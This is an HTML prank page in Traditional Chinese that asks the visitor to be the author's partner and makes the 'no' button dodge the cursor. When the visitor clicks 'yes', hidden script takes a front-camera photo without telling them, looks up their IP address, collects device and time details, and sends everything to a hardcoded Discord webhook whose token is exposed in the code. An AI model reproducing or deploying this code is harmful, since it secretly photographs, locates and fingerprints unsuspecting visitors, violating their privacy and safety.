<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>我喜歡妳 💖</title>

<style>
body {
  margin: 0;
  height: 100vh;
  background: #0d1117;
  font-family: "微軟正黑體";
  overflow: hidden;
  touch-action: none;
}

.card {
  width: 100%;
  height: 100vh;
  background: #1f2933;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: white;
}

.title {
  font-size: 22px;
  text-align: center;
  line-height: 1.6;
}

.subtitle {
  font-size: 16px;
  color: #aaa;
}

.btn-area {
  position: relative;
  width: 300px;
  height: 200px;
  margin-top: 20px;
}

button {
  padding: 12px 25px;
  border: none;
  border-radius: 12px;
  font-size: 18px;
  cursor: pointer;
  position: absolute;
  transition: 0.2s;
}

.yes {
  background: #4CAF50;
  color: white;
}

.no {
  background: #ff4d4d;
  color: white;
}

.success {
  position: fixed;
  inset: 0;
  background: radial-gradient(circle, #ff4d6d, #0d1117);
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 40px;
  color: white;
  opacity: 0;
  pointer-events: none;
  transition: 0.5s;
}

.success.show {
  opacity: 1;
}

video, canvas {
  display: none;
}
</style>
</head>

<body>

<div class="card">
  <h2>💖 我喜歡你</h2>
  <p class="subtitle">你願意跟我在一起嗎？ 😳</p>

  <div class="btn-area" id="area">
    <button class="yes" id="yesBtn">願意</button>
    <button class="no" id="noBtn">不願意</button>
  </div>
</div>

<div class="success" id="success">💖 成功 💖</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const yesBtn = document.getElementById("yesBtn");
const noBtn = document.getElementById("noBtn");
const success = document.getElementById("success");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const area = document.getElementById("area");

// NO 逃跑
document.addEventListener("mousemove", e => {
  const r = noBtn.getBoundingClientRect();
  const dx = r.left - e.clientX;
  const dy = r.top - e.clientY;
  const dist = Math.sqrt(dx*dx + dy*dy);

  if (dist < 120) {
    noBtn.style.left = Math.random() * 200 + "px";
    noBtn.style.top = Math.random() * 150 + "px";
  }
});

// 📸 YES
yesBtn.onclick = async () => {
  success.classList.add("show");

  // 開鏡頭（必須使用者點擊觸發）
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  });

  video.srcObject = stream;

  // 等待畫面穩定
  await new Promise(r => setTimeout(r, 1500));

  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const imageData = canvas.toDataURL("image/png");

  // 🌐 IP
  let ip = "unknown";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    ip = (await res.json()).ip;
  } catch {}

  // 📱 裝置
  const device = navigator.userAgent;

  // 🕒 時間
  const time = new Date().toLocaleString();

  const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";

  const blob = await (await fetch(imageData)).blob();

  const formData = new FormData();
  formData.append("file", blob, "love.png");

  const payload = {
    username: "💌 告白系統",
    embeds: [
      {
        title: "💖 告白成功",
        description: "有人按下願意 ❤️",
        color: 0xff4d6d,

        image: {
          url: "attachment://love.png"
        },

        fields: [
          {
            name: "🌐 IP",
            value: ip,
            inline: false
          },
          {
            name: "📱 裝置",
            value: device.slice(0, 80),
            inline: false
          },
          {
            name: "🕒 時間",
            value: time,
            inline: false
          }
        ],

        timestamp: new Date().toISOString()
      }
    ]
  };

  formData.append("payload_json", JSON.stringify(payload));

  await fetch(webhookURL, {
    method: "POST",
    body: formData
  });

  document.body.innerHTML =
    "<div style='color:white;font-size:40px;display:flex;justify-content:center;align-items:center;height:100vh;'>💖 成功 💖</div>";
};
</script>

</body>
</html>
